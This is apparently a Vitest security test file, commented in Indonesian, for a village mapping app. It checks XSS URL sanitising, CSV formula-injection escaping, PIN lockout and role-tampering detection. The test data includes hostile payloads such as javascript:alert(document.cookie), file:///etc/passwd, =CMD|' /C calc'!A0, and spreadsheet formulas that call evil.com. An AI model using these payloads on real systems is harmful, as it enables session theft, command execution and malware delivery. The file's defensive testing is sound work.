// @vitest-environment jsdom
import { beforeEach, describe, expect, it } from "vitest";
import {
  susunAtributPolygonPrmAid,
  susunAtributLinePrmAid,
  susunAtributPointPrmAid,
  sanitasiUrlPrmAid,
  KOLOM_TABEL_POLYGON_PRM_AID,
  KOLOM_TABEL_LINE_PRM_AID,
  KOLOM_TABEL_POINT_PRM_AID
} from "../lib/atributPrmAid";
import { eksporKeCSV, eksporKeGeoJSON, sanitasiFormulaCsv } from "../lib/geoUtils";
import { DataSpasialItem } from "../types";
import { validasiPin, BATAS_SALAH_PIN } from "../lib/kunciCepat";
import { hitungSigPeran } from "../lib/auth";

describe("Audit & Pengujian Keamanan Aplikasi Titik Tapak", () => {
  describe("1. Keamanan Atribut PRM-AID & Pencegahan Stored XSS", () => {
    it("Atribut Polygon, Line, dan Point hanya memuat kolom tabel yang ditentukan", () => {
      const poly = susunAtributPolygonPrmAid({
        jenisGeometri: "polygon",
        judul: "Kawasan Hutan Adat",
        kategori: "Wilayah Adat / Lahan",
        deskripsi: "Hutan ulayat desa",
        luasHa: 45.8,
        url: "https://walaya.prm.my.id/hutan.jpg"
      });
      expect(Object.keys(poly)).toEqual([...KOLOM_TABEL_POLYGON_PRM_AID]);
      expect(poly).toEqual({
        label: "Kawasan Hutan Adat",
        luas_ha: 45.8,
        keterangan: "Hutan ulayat desa",
        url: "https://walaya.prm.my.id/hutan.jpg",
        tepi: "#4E4E4E",
        warna: "#4e4e4e"
      });

      const line = susunAtributLinePrmAid({
        jenisGeometri: "line",
        judul: "Sungai Padas",
        kategori: "Mata Air",
        deskripsi: "Aliran air desa",
        panjangKm: 2.4,
        url: "https://walaya.prm.my.id/sungai.jpg"
      });
      expect(Object.keys(line)).toEqual([...KOLOM_TABEL_LINE_PRM_AID]);
      expect(line).toEqual({
        label: "Sungai Padas",
        panjang_m: 2400,
        keterangan: "Aliran air desa",
        url: "https://walaya.prm.my.id/sungai.jpg",
        warna: "#00BFFF"
      });

      const point = susunAtributPointPrmAid({
        jenisGeometri: "point",
        judul: "Masjid Baiturrahman",
        kategori: "Agama",
        deskripsi: "Tempat ibadah warga",
        url: "https://walaya.prm.my.id/masjid.jpg"
      });
      expect(Object.keys(point)).toEqual([...KOLOM_TABEL_POINT_PRM_AID]);
      expect(point).toEqual({
        label: "Masjid Baiturrahman",
        kategori: "Agama",
        keterangan: "Tempat ibadah warga",
        url: "https://walaya.prm.my.id/masjid.jpg",
        simbol: "mosque.png"
      });
    });

    it("Menetralkan protokol URL berbahaya (javascript:, data:, vbscript:) untuk mencegah XSS", () => {
      expect(sanitasiUrlPrmAid("javascript:alert(document.cookie)")).toBe("");
      expect(sanitasiUrlPrmAid("JAVASCRIPT:alert('XSS')")).toBe("");
      expect(sanitasiUrlPrmAid("data:text/html,<script>alert(1)</script>")).toBe("");
      expect(sanitasiUrlPrmAid("vbscript:msgbox(1)")).toBe("");
      expect(sanitasiUrlPrmAid("file:///etc/passwd")).toBe("");

      // URL sah tetap dipertahankan
      expect(sanitasiUrlPrmAid("https://walaya.prm.my.id/peta")).toBe("https://walaya.prm.my.id/peta");
      expect(sanitasiUrlPrmAid("http://example.org/foto.jpg")).toBe("http://example.org/foto.jpg");
      expect(sanitasiUrlPrmAid("/assets/ikon.png")).toBe("/assets/ikon.png");
    });
  });

  describe("2. Pencegahan CSV / Spreadsheet Formula Injection (CWE-1236)", () => {
    it("Menetralkan karakter pembuka formula berbahaya dengan tanda kutip tunggal", () => {
      expect(sanitasiFormulaCsv("=CMD|' /C calc'!A0")).toBe("'=CMD|' /C calc'!A0");
      expect(sanitasiFormulaCsv("+SUM(A1:A10)")).toBe("'+SUM(A1:A10)");
      expect(sanitasiFormulaCsv("-2+3")).toBe("'-2+3");
      expect(sanitasiFormulaCsv("@IMPORTXML('http://evil.com')")).toBe("'@IMPORTXML('http://evil.com')");
      expect(sanitasiFormulaCsv("\t=DANGEROUS()")).toBe("'\t=DANGEROUS()");
    });

    it("Membiarkan angka negatif koordinat dan desimal murni tetap valid tanpa tanda kutip", () => {
      expect(sanitasiFormulaCsv("-0.9475")).toBe("-0.9475");
      expect(sanitasiFormulaCsv("-123.456")).toBe("-123.456");
      expect(sanitasiFormulaCsv("100.25")).toBe("100.25");
    });

    it("Ekspor CSV otomatis menetralkan objek berbahaya pada seluruh kolom", () => {
      const itemJahat: DataSpasialItem = {
        id: "SPS-JAHAT-01",
        idKader: "KDR-01",
        namaKader: "Kader Uji",
        desaWilayah: "Desa Rimba",
        jenisGeometri: "polygon",
        kategori: "Wilayah Adat / Lahan",
        judul: '=HYPERLINK("http://evil.com/malware.exe")',
        deskripsi: "+SUM(A1:A100)",
        koordinat: [
          { lat: -1.5, lng: 102.5 },
          { lat: -1.6, lng: 102.5 },
          { lat: -1.6, lng: 102.6 },
          { lat: -1.5, lng: 102.5 }
        ],
        panjangKm: 0,
        luasHa: 10,
        url: "javascript:alert(1)",
        statusSinkron: "lokal",
        createdAt: "2026-11-01T08:00:00Z",
        updatedAt: "2026-11-01T08:00:00Z",
        riwayatPembaruan: []
      };

      const csv = eksporKeCSV([itemJahat]);
      // Periksa bahwa judul dan deskripsi ternetralkan
      expect(csv).toContain("'=HYPERLINK");
      expect(csv).toContain("'+SUM(A1:A100)");
      // URL jahat dinetralkan menjadi string kosong
      const geo = JSON.parse(eksporKeGeoJSON([itemJahat]));
      expect(geo.features[0].properties.url).toBe("");
    });
  });

  describe("3. Keamanan PIN & Pencegahan Serangan Brute-Force", () => {
    it("Validasi PIN menolak PIN lemah, angka kembar, urutan, dan pola berulang", () => {
      expect(validasiPin("111111")).toMatch(/sama/);
      expect(validasiPin("123456")).toMatch(/berurutan/);
      expect(validasiPin("654321")).toMatch(/berurutan/);
      expect(validasiPin("121212")).toMatch(/pola/);
      expect(validasiPin("123123")).toMatch(/pola/);
      expect(validasiPin("12345")).toMatch(/6 angka/);
      expect(validasiPin("1234567")).toMatch(/6 angka/);
      expect(validasiPin("592814")).toBeNull(); // PIN kuat diterima
    });

    it("Batas kegagalan PIN adalah 5 kali sebelum PIN dinonaktifkan (lockout)", () => {
      expect(BATAS_SALAH_PIN).toBe(5);
    });
  });

  describe("4. Integritas Peran & Perlindungan Anti-Tampering Sesi (HMAC-SHA256)", () => {
    it("Mengubah peran secara lokal di localStorage terdeteksi karena ketidakcocokan sigPeran", () => {
      const akunKader = {
        idKader: "KDR-007",
        email: "kader.desa@titiktapak.id",
        peran: "kader" as const,
        garam: "somerandomsalt123",
        kataSandiHash: "somehashvalue456",
        statusPersetujuan: "disetujui" as const
      };
      const sigAsli = hitungSigPeran(akunKader);

      // Hacker mencoba memalsukan peran menjadi admin dengan garam dan hash yang sama
      const akunDipalsukan = {
        ...akunKader,
        peran: "admin" as const
      };
      const sigPalsu = hitungSigPeran(akunDipalsukan);

      expect(sigPalsu).not.toBe(sigAsli);
    });
  });
});
